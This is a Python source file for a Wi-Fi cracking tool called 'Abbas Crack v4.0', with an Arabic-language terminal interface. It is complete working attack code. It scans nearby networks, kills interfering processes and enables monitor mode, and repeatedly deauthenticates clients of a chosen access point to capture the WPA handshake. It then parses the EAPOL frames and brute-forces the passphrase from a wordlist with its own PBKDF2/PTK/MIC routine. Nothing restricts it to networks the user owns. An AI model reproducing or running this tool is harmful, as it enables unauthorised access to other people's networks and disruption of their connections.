#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Abbas Crack v4.0 - TUI لوحين: سكان + سحب إلى خانة Handshake + كسر تلقائي
يعمل على Termux و Kali بدون scapy
المبرمج: جنرال عباس 🇮🇶
"""

import os, sys, struct, hmac, hashlib, time, argparse, multiprocessing
import subprocess, re, signal, shutil, json, glob, curses, threading
from datetime import datetime
from queue import Queue, Empty


class C:
    RED='\033[91m'; GREEN='\033[92m'; YELLOW='\033[93m'
    BLUE='\033[94m'; CYAN='\033[96m'; WHITE='\033[97m'
    BOLD='\033[1m'; RESET='\033[0m'; GRAY='\033[90m'
    MAGENTA='\033[95m'


WORK_DIR   = os.path.expanduser("~/abbas_crack")
HS_DIR     = os.path.join(WORK_DIR, "hs")
DUMP_DIR   = os.path.join(WORK_DIR, "dumps")
LOG_FILE   = os.path.join(WORK_DIR, "abbas.log")
STATE_FILE = os.path.join(WORK_DIR, "state.json")
DEFAULT_WL = os.path.join(WORK_DIR, "pass123.txt")

for d in (WORK_DIR, HS_DIR, DUMP_DIR):
    os.makedirs(d, exist_ok=True)


def log(msg):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{ts}] {msg}\n")


def run(cmd, timeout=None, capture=True):
    try:
        r = subprocess.run(cmd, shell=isinstance(cmd, str),
                           capture_output=capture, text=True, timeout=timeout)
        return r.returncode, r.stdout or "", r.stderr or ""
    except subprocess.TimeoutExpired:
        return 124, "", "timeout"
    except Exception as e:
        return 1, "", str(e)


def have(tool):
    return shutil.which(tool) is not None


# ================= PCAP parser (v1.1 core) =================

def read_pcap(filepath):
    with open(filepath, 'rb') as f:
        data = f.read()
    if len(data) < 24:
        raise ValueError("الملف صغير جداً")
    magic = data[0:4]
    m_le = struct.unpack('<I', magic)[0]
    m_be = struct.unpack('>I', magic)[0]
    if m_le in (0xa1b2c3d4, 0xa1b23c4d): endian = '<'
    elif m_be in (0xa1b2c3d4, 0xa1b23c4d): endian = '>'
    elif m_le in (0xd4c3b2a1, 0x4d3cb2a1): endian = '>'
    elif m_be in (0xd4c3b2a1, 0x4d3cb2a1): endian = '<'
    else: raise ValueError(f"ليس pcap صالح (magic={magic.hex()})")
    linktype = struct.unpack(endian + 'I', data[20:24])[0]
    packets = []; off = 24
    while off + 16 <= len(data):
        incl_len = struct.unpack(endian + 'I', data[off+8:off+12])[0]
        off += 16
        if off + incl_len > len(data): break
        packets.append(data[off:off+incl_len])
        off += incl_len
    return linktype, packets


def strip_radiotap(pkt):
    if len(pkt) < 8: return None
    it_len = struct.unpack('<H', pkt[2:4])[0]
    if it_len > len(pkt) or it_len < 8: return None
    return pkt[it_len:]


def dot11_fc(frame):
    if len(frame) < 2: return None, None
    fc = struct.unpack('<H', frame[0:2])[0]
    return (fc >> 2) & 0x3, (fc >> 4) & 0xf


def get_ssid(frame):
    ftype, subtype = dot11_fc(frame)
    if ftype != 0 or subtype not in (5, 8): return None
    if len(frame) < 36: return None
    tags = frame[36:]; i = 0
    while i + 2 <= len(tags):
        tid = tags[i]; tlen = tags[i+1]
        if i + 2 + tlen > len(tags): break
        if tid == 0: return bytes(tags[i+2:i+2+tlen])
        i += 2 + tlen
    return None


def extract_eapol(frame):
    ftype, subtype = dot11_fc(frame)
    if ftype != 2: return None
    fc = struct.unpack('<H', frame[0:2])[0]
    to_ds = (fc >> 8) & 1; from_ds = (fc >> 9) & 1
    hdr = 24
    if subtype & 0x8: hdr += 2
    if to_ds and from_ds: hdr += 6
    if len(frame) < hdr + 8: return None
    llc = frame[hdr:hdr+8]
    if llc[:6] != b'\xaa\xaa\x03\x00\x00\x00': return None
    if llc[6:8] != b'\x88\x8e': return None
    return frame[hdr+8:], frame


def parse_eapol_key(eapol):
    if len(eapol) < 99: return None
    if eapol[1] != 3: return None
    body = eapol[4:]
    if len(body) < 95: return None
    key_info = struct.unpack('>H', body[1:3])[0]
    key_ack = (key_info >> 7) & 1
    key_mic = (key_info >> 8) & 1
    nonce = body[13:45]; mic = body[77:93]
    eapol_len = struct.unpack('>H', eapol[2:4])[0]
    total = min(4 + eapol_len, len(eapol))
    return {'raw': eapol[:total], 'key_ack': key_ack, 'key_mic': key_mic,
            'nonce': nonce, 'mic': mic}


def parse_handshake(filepath, quiet=True):
    try:
        linktype, packets = read_pcap(filepath)
    except Exception:
        return None
    ssid = None; m1_list, m2_list = [], []
    for pkt in packets:
        frame = pkt
        if linktype == 127:
            frame = strip_radiotap(pkt)
            if frame is None: continue
        if not ssid:
            s = get_ssid(frame)
            if s: ssid = s
        res = extract_eapol(frame)
        if not res: continue
        eapol, full = res
        parsed = parse_eapol_key(eapol)
        if not parsed or len(full) < 16: continue
        a1 = full[4:10]; a2 = full[10:16]
        if parsed['key_ack'] and not parsed['key_mic']:
            m1_list.append({'nonce': parsed['nonce'], 'ap': a2, 'sta': a1, 'eapol': parsed['raw']})
        elif parsed['key_mic'] and not parsed['key_ack']:
            m2_list.append({'nonce': parsed['nonce'], 'sta': a2, 'ap': a1,
                            'mic': parsed['mic'], 'eapol': parsed['raw']})
    if not ssid or not m1_list or not m2_list: return None
    for m1 in m1_list:
        for m2 in m2_list:
            if m1['ap'] == m2['ap'] and m1['sta'] == m2['sta']:
                mac1, mac2 = sorted([m1['ap'], m1['sta']])
                n1, n2 = sorted([m1['nonce'], m2['nonce']])
                return {'ssid': ssid, 'mac1': mac1, 'mac2': mac2,
                        'nonce1': n1, 'nonce2': n2, 'mic': m2['mic'], 'eapol': m2['eapol']}
    return None


# ================= Crypto engine =================

_G = {}
def _init(hs):
    global _G
    _G = hs

def compute_pmk(pw, ssid):
    return hashlib.pbkdf2_hmac('sha1', pw, ssid, 4096, 32)

def compute_ptk(pmk, m1, m2, n1, n2):
    data = m1 + m2 + n1 + n2
    ptk = b''
    for i in range(4):
        ptk += hmac.new(pmk, b"Pairwise key expansion\x00" + data + bytes([i]), hashlib.sha1).digest()
    return ptk[:64]

def check_pw(pw):
    try:
        pmk = compute_pmk(pw, _G['ssid'])
        ptk = compute_ptk(pmk, _G['mac1'], _G['mac2'], _G['nonce1'], _G['nonce2'])
        frame = bytearray(_G['eapol'])
        for i in range(81, 97): frame[i] = 0
        comp = hmac.new(ptk[:16], bytes(frame), hashlib.sha1).digest()[:16]
        if hmac.compare_digest(comp, _G['mic']): return pw
    except Exception: pass
    return None


def crack_worker(hs, wl_path, workers=None, single=False,
                 progress_q=None, cancel_ev=None):
    if not os.path.exists(wl_path): return None
    with open(wl_path, 'rb') as f:
        passwords = [l.strip() for l in f if l.strip()]
    total = len(passwords)
    if single or total < 100: workers = 1
    elif workers is None:
        try: workers = max(1, multiprocessing.cpu_count() - 1)
        except Exception: workers = 1

    start = time.time(); found = None; tested = 0
    try:
        if workers == 1:
            _init(hs)
            for pw in passwords:
                if cancel_ev and cancel_ev.is_set(): return None
                tested += 1
                r = check_pw(pw)
                if r: found = r; break
                if progress_q and tested % 200 == 0:
                    progress_q.put(("progress", tested, total, time.time() - start))
        else:
            with multiprocessing.Pool(workers, initializer=_init, initargs=(hs,)) as pool:
                for r in pool.imap_unordered(check_pw, passwords, chunksize=200):
                    if cancel_ev and cancel_ev.is_set():
                        pool.terminate(); return None
                    tested += 1
                    if r: found = r; pool.terminate(); break
                    if progress_q and tested % 200 == 0:
                        progress_q.put(("progress", tested, total, time.time() - start))
    except Exception:
        _init(hs)
        for pw in passwords[tested:]:
            if cancel_ev and cancel_ev.is_set(): return None
            tested += 1
            r = check_pw(pw)
            if r: found = r; break

    if found:
        pwd = found.decode('utf-8', errors='ignore')
        if progress_q: progress_q.put(("done", pwd, tested, time.time() - start))
        log(f"CRACKED ssid={hs['ssid'].decode('utf-8', errors='ignore')} pwd={pwd}")
        return pwd
    if progress_q: progress_q.put(("fail", tested, total, time.time() - start))
    return None


# ================= Interface mgmt =================

def detect_monitor_iface():
    rc, out, _ = run(["iw", "dev"])
    if rc != 0: return None
    cur = None
    for line in out.splitlines():
        line = line.strip()
        if line.startswith("Interface "): cur = line.split()[1]
        elif line == "type monitor" and cur: return cur
    return None


def detect_managed_iface():
    rc, out, _ = run(["nmcli", "-t", "-f", "DEVICE,TYPE", "device", "status"])
    for line in out.splitlines():
        if "wifi" in line: return line.split(":")[0]
    return None


def enable_monitor(base_iface=None):
    iface = detect_monitor_iface()
    if iface: return iface
    if base_iface is None: base_iface = detect_managed_iface()
    if not base_iface: return None
    run(["airmon-ng", "check", "kill"])
    run(["airmon-ng", "start", base_iface])
    iface = detect_monitor_iface()
    if not iface:
        rc, out, _ = run(["iw", "dev", base_iface, "info"])
        if "type monitor" in out: iface = base_iface
    return iface


# ================= Async scan / capture =================

def scan_networks_async(iface, duration, out_q):
    out_csv = os.path.join(DUMP_DIR, f"scan_{int(time.time())}")
    cmd = ["timeout", str(duration), "airodump-ng",
           "--output-format", "csv", "-w", out_csv, iface]
    p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for i in range(duration):
        out_q.put(("scan_progress", i + 1, duration))
        time.sleep(1)
    try: p.wait(timeout=5)
    except: p.kill()

    csvs = glob.glob(out_csv + "*.csv")
    aps = []
    if csvs:
        with open(csvs[0], encoding="utf-8", errors="ignore") as f:
            lines = f.readlines()
        in_ap = False
        for line in lines:
            s = line.strip()
            if s.startswith("BSSID"): in_ap = True; continue
            if s.startswith("Station MAC"): in_ap = False; continue
            if not in_ap or not s: continue
            parts = [x.strip() for x in line.split(",")]
            if len(parts) < 14: continue
            bssid = parts[0]
            if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bssid): continue
            try:
                ch = int(parts[3]) if parts[3].isdigit() else 0
                pwr = int(parts[8]) if parts[8].lstrip("-").isdigit() else -100
            except: ch, pwr = 0, -100
            aps.append({"bssid": bssid, "channel": ch, "power": pwr,
                        "encryption": parts[5], "cipher": parts[6],
                        "auth": parts[7], "essid": parts[13] or "<hidden>"})
        aps.sort(key=lambda x: x["power"], reverse=True)
    out_q.put(("scan_done", aps))


def capture_handshake_async(iface, ap, timeout, out_q):
    safe = re.sub(r"[^\w.-]", "_", ap['essid'] or "unknown")[:32]
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    prefix = os.path.join(HS_DIR, f"handshake_{safe}_{ap['bssid'].replace(':','-')}_{ts}")
    cap_file = prefix + "-01.cap"

    ad_cmd = ["airodump-ng", "-c", str(ap['channel']), "--bssid", ap['bssid'],
              "-w", prefix, "--output-format", "pcap", iface]
    ad = subprocess.Popen(ad_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    out_q.put(("cap_status", "airodump: ch=" + str(ap['channel'])))
    time.sleep(4)

    start = time.time(); captured = None
    for rnd in range(1, 9):
        if time.time() - start > timeout: break
        out_q.put(("cap_status", f"deauth جولة {rnd}"))
        run(["aireplay-ng", "--deauth", "10", "-a", ap['bssid'], iface], timeout=15)
        for _ in range(20):
            time.sleep(1)
            if time.time() - start > timeout: break
            out_q.put(("cap_status", f"فحص... ({int(time.time()-start)}s)"))
            if os.path.exists(cap_file):
                hs = parse_handshake(cap_file, quiet=True)
                if hs:
                    captured = cap_file
                    break
        if captured: break

    ad.send_signal(signal.SIGINT)
    try: ad.wait(timeout=8)
    except: ad.kill()

    if captured:
        out_q.put(("cap_done", captured, ap))
    else:
        out_q.put(("cap_fail", ap))


# ================= TUI =================

def draw_network_panel(stdscr, aps, idx, top, panel_y, panel_x, panel_h, panel_w):
    stdscr.addstr(panel_y, panel_x,
                  "┌─ Networks ──────────────────┐", curses.color_pair(4))
    visible = panel_h - 3
    if idx < top: top = idx
    if idx >= top + visible: top = idx - visible + 1

    for i in range(top, min(len(aps), top + visible)):
        ap = aps[i]
        col = curses.color_pair(1) if ap['power'] > -60 else (
              curses.color_pair(2) if ap['power'] > -75 else curses.color_pair(3))
        marker = "▶" if i == idx else " "
        ssid = ap['essid'][:14]
        line = f"│{marker} {ssid:<14} {ap['power']:>4}dBm │"
        attr = col | (curses.A_REVERSE if i == idx else 0)
        try: stdscr.addstr(panel_y + 1 + (i - top), panel_x, line[:panel_w], attr)
        except curses.error: pass
    stdscr.addstr(panel_y + panel_h - 1, panel_x,
                  "└" + "─" * (panel_w - 2) + "┘", curses.color_pair(4))
    return top


def draw_handshake_slot(stdscr, slot, cap_status, panel_y, panel_x, panel_h, panel_w):
    stdscr.addstr(panel_y, panel_x,
                  "┌─ Handshake Slot ────────────┐", curses.color_pair(4))
    if slot is None:
        msg = "   [ فارغ — اسحب شبكة ]"
        stdscr.addstr(panel_y + 3, panel_x + 1, msg[:panel_w - 2], curses.color_pair(3))
    else:
        stdscr.addstr(panel_y + 2, panel_x + 1,
                      f" SSID: {slot['essid'][:18]}", curses.color_pair(1) | curses.A_BOLD)
        stdscr.addstr(panel_y + 3, panel_x + 1,
                      f" BSSID: {slot['bssid']}", curses.color_pair(2))
        stdscr.addstr(panel_y + 4, panel_x + 1,
                      f" CH: {slot['channel']}  PWR: {slot['power']}dBm", curses.color_pair(2))
        if slot.get('cap'):
            stdscr.addstr(panel_y + 5, panel_x + 1,
                          f" ✅ {os.path.basename(slot['cap'])[:22]}", curses.color_pair(1))
        elif cap_status:
            stdscr.addstr(panel_y + 5, panel_x + 1,
                          f" {cap_status[:26]}", curses.color_pair(2))
        else:
            stdscr.addstr(panel_y + 5, panel_x + 1,
                          " [ اضغط D لسحب الشبكة ]", curses.color_pair(3))
    for i in range(1, panel_h - 1):
        try: stdscr.addstr(panel_y + i, panel_x + panel_w - 1, "│", curses.color_pair(4))
        except curses.error: pass
    stdscr.addstr(panel_y + panel_h - 1, panel_x,
                  "└" + "─" * (panel_w - 2) + "┘", curses.color_pair(4))


def draw_status_bar(stdscr, h, w, msg, cracked=None):
    bar = f" {msg} " if msg else ""
    bar = bar[:w - 1]
    try:
        stdscr.addstr(h - 2, 0, bar.ljust(w - 1),
                      curses.color_pair(4) | curses.A_REVERSE)
    except curses.error: pass
    keys = " [S]سكان  [↑/↓]تنقل  [D]سحب  [C]كسر  [R]إعادة  [Q]خروج "
    try:
        stdscr.addstr(h - 1, 0, keys[:w - 1],
                      curses.color_pair(2) | curses.A_REVERSE)
    except curses.error: pass
    if cracked:
        try:
            stdscr.addstr(h - 3, 2,
                          f" ✅ كلمة السر: {cracked} ",
                          curses.color_pair(1) | curses.A_BOLD | curses.A_REVERSE)
        except curses.error: pass


def tui_main(stdscr, iface, wl_path, scan_time, attack_timeout, workers, single):
    curses.curs_set(0)
    curses.use_default_colors()
    curses.init_pair(1, curses.COLOR_GREEN, -1)
    curses.init_pair(2, curses.COLOR_YELLOW, -1)
    curses.init_pair(3, curses.COLOR_RED, -1)
    curses.init_pair(4, curses.COLOR_CYAN, -1)
    curses.init_pair(5, curses.COLOR_MAGENTA, -1)

    aps = []
    idx = 0
    top = 0
    slot = None
    status_msg = "جاهز — اضغط S لسكان الشبكات"
    cap_status = ""
    cracked_pwd = None
    out_q = Queue()

    while True:
        h, w = stdscr.getmaxyx()
        stdscr.clear()

        title = " Abbas Crack v4.0 — جنرال عباس 🇮🇶 "
        stdscr.addstr(0, max(0, (w - len(title)) // 2), title,
                      curses.color_pair(5) | curses.A_BOLD)

        panel_h = h - 6
        panel_w = max(30, w // 2 - 2)
        draw_network_panel(stdscr, aps, idx, top, 1, 1, panel_h, panel_w)
        draw_handshake_slot(stdscr, slot, cap_status, 1, w - panel_w - 1,
                            panel_h, panel_w)
        draw_status_bar(stdscr, h, w, status_msg, cracked_pwd)
        stdscr.refresh()

        # drain queue
        try:
            while True:
                msg = out_q.get_nowait()
                if msg[0] == "scan_progress":
                    status_msg = f"سكان... {msg[1]}/{msg[2]}s"
                elif msg[0] == "scan_done":
                    aps = msg[1]
                    idx = 0; top = 0
                    status_msg = f"وُجد {len(aps)} شبكة — اختر بـ↑/↓ ثم D للسحب"
                elif msg[0] == "cap_status":
                    cap_status = msg[1]
                    status_msg = msg[1]
                elif msg[0] == "cap_done":
                    _, cap, ap = msg
                    slot = {**ap, "cap": cap}
                    cap_status = "✅ Handshake في الخانة"
                    status_msg = "الـ Handshake جاهز — اضغط C للكسر"
                    st = {}
                    if os.path.exists(STATE_FILE):
                        try: st = json.load(open(STATE_FILE))
                        except: st = {}
                    st.setdefault("captures", []).append({
                        "file": cap, "essid": ap['essid'], "bssid": ap['bssid'],
                        "channel": ap['channel'], "ts": datetime.now().isoformat()})
                    json.dump(st, open(STATE_FILE, "w"), indent=2, ensure_ascii=False)
                elif msg[0] == "cap_fail":
                    cap_status = "❌ فشل الالتقاط"
                    status_msg = "جرّب مرة ثانية — أو اقترب من الهدف"
                elif msg[0] == "crack_progress":
                    _, tested, total, el = msg
                    status_msg = f"كسر... {tested:,}/{total:,} ({int(el)}s)"
                elif msg[0] == "crack_done":
                    _, pwd, tested, el = msg
                    cracked_pwd = pwd
                    status_msg = f"✅ {pwd} — {tested:,} محاولة في {int(el)}s"
                elif msg[0] == "crack_fail":
                    _, tested, total, el = msg
                    status_msg = f"❌ ما لقيت — {tested:,} محاولة"
        except Empty:
            pass

        stdscr.timeout(250)
        ch = stdscr.getch()
        if ch == -1: continue

        if ch in (ord('q'), ord('Q')):
            return
        elif ch in (ord('s'), ord('S')):
            aps = []; slot = None; cracked_pwd = None
            status_msg = f"سكان {scan_time}s على {iface}..."
            stdscr.clear()
            stdscr.addstr(2, 2, status_msg, curses.color_pair(2))
            stdscr.refresh()
            t = threading.Thread(target=scan_networks_async,
                                 args=(iface, scan_time, out_q), daemon=True)
            t.start()
        elif ch in (curses.KEY_UP, ord('k')) and aps:
            idx = (idx - 1) % len(aps)
        elif ch in (curses.KEY_DOWN, ord('j')) and aps:
            idx = (idx + 1) % len(aps)
        elif ch in (ord('d'), ord('D')) and aps:
            sel = aps[idx]
            slot = {**sel, "cap": None}
            cap_status = "بدء الهجوم..."
            status_msg = f"هجوم على {sel['essid']} ({sel['bssid']})..."
            t = threading.Thread(target=capture_handshake_async,
                                 args=(iface, sel, attack_timeout, out_q),
                                 daemon=True)
            t.start()
        elif ch in (ord('c'), ord('C')) and slot and slot.get('cap'):
            status_msg = f"كسر بـ {os.path.basename(wl_path)}..."
            hs = parse_handshake(slot['cap'], quiet=True)
            if not hs:
                status_msg = "❌ الـ Handshake غير صالح"
                continue

            def crack_t():
                local_q = Queue()
                def poll():
                    while True:
                        try:
                            m = local_q.get(timeout=0.3)
                            if m[0] == "progress":
                                out_q.put(("crack_progress", m[1], m[2], m[3]))
                            elif m[0] == "done":
                                out_q.put(("crack_done", m[1], m[2], m[3])); return
                            elif m[0] == "fail":
                                out_q.put(("crack_fail", m[1], m[2], m[3])); return
                        except Empty:
                            continue
                th = threading.Thread(target=poll, daemon=True)
                th.start()
                crack_worker(hs, wl_path, workers, single, local_q)
            threading.Thread(target=crack_t, daemon=True).start()
        elif ch in (ord('r'), ord('R')):
            aps = []; slot = None; cracked_pwd = None; cap_status = ""
            status_msg = "تم التصفير"


# ================= CLI =================

def main():
    p = argparse.ArgumentParser(description="Abbas Crack v4.0 — TUI لوحين")
    p.add_argument("--iface", default=None)
    p.add_argument("--wordlist", default=DEFAULT_WL)
    p.add_argument("--scan-time", type=int, default=25)
    p.add_argument("--attack-timeout", type=int, default=180)
    p.add_argument("-j", "--workers", type=int, default=None)
    p.add_argument("--single", action="store_true")
    p.add_argument("--no-tui", action="store_true")
    a = p.parse_args()

    for tool in ("airodump-ng", "aireplay-ng"):
        if not have(tool):
            print(f"{C.RED}❌ {tool} غير مثبت — ثبّت aircrack-ng{C.RESET}")
            return

    iface = a.iface or enable_monitor()
    if not iface:
        print(f"{C.RED}❌ لم أجد واجهة monitor. شغّل: airmon-ng start wlan0{C.RESET}")
        return
    print(f"{C.GREEN}[+] Interface: {iface}{C.RESET}")

    if not os.path.exists(a.wordlist):
        print(f"{C.YELLOW}⚠️ أنشئ {a.wordlist} أولاً{C.RESET}")

    if a.no_tui:
        print(f"{C.BLUE}[*] سكان {a.scan_time}s...{C.RESET}")
        q = Queue()
        scan_networks_async(iface, a.scan_time, q)
        aps = []
        while True:
            m = q.get()
            if m[0] == "scan_done": aps = m[1]; break
        for i, ap in enumerate(aps, 1):
            print(f"{i:>3}. [{ap['power']:>4}dBm] ch{ap['channel']:<3} "
                  f"{ap['encryption']:<8} {ap['bssid']}  {ap['essid']}")
        if not aps: return
        try: n = int(input("رقم الشبكة: "))
        except: return
        if not (1 <= n <= len(aps)): return
        sel = aps[n - 1]
        print(f"{C.MAGENTA}[*] الهدف: {sel['essid']} ({sel['bssid']}){C.RESET}")
        q2 = Queue()
        capture_handshake_async(iface, sel, a.attack_timeout, q2)
        cap = None
        while True:
            m = q2.get()
            if m[0] == "cap_status": print(f"{C.GRAY}  {m[1]}{C.RESET}")
            elif m[0] == "cap_done": cap = m[1]; break
            elif m[0] == "cap_fail": break
        if not cap: return
        hs = parse_handshake(cap)
        if hs: crack_worker(hs, a.wordlist, a.workers, a.single, None)
        return

    curses.wrapper(tui_main, iface, a.wordlist, a.scan_time,
                   a.attack_timeout, a.workers, a.single)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.YELLOW}⏹️ تم الإيقاف.{C.RESET}")
    except Exception as e:
        print(f"\n{C.RED}❌ خطأ: {e}{C.RESET}")
